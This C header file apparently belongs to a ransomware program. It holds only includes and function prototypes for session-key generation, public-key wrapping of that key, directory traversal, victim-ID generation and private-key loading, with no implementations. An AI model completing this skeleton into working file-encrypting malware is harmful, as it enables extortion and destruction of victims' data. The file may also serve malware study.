#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <ifaddrs.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <linux/limits.h>
#include <dirent.h>
#include <sys/stat.h>

extern unsigned int decryptFlag;

int generateSessionKey(char *key, size_t length);
EVP_PKEY *getPublicKey();
unsigned char *wrapSessionKey(EVP_PKEY *publicKey, const unsigned char *session_key, size_t sessionKeyLen, size_t *wrappedKeyLen);
unsigned char *unwrapSessionKey(EVP_PKEY *privateKey, const unsigned char *wrappedKey, size_t wrappedKeyLen, size_t *outSessionKeyLen);
void storeWrappedBlob(const unsigned char *wrappedKey, size_t wrappedKeyLen);
unsigned char *base64Encode(const unsigned char *wrappedKey, size_t inlen);
unsigned char *base64Decode(const char *b64WrappedKey, size_t *outlen);
void loopDir(const char *filePath);
char* generateVictimID(void);
EVP_PKEY *loadPrivate(const char *path);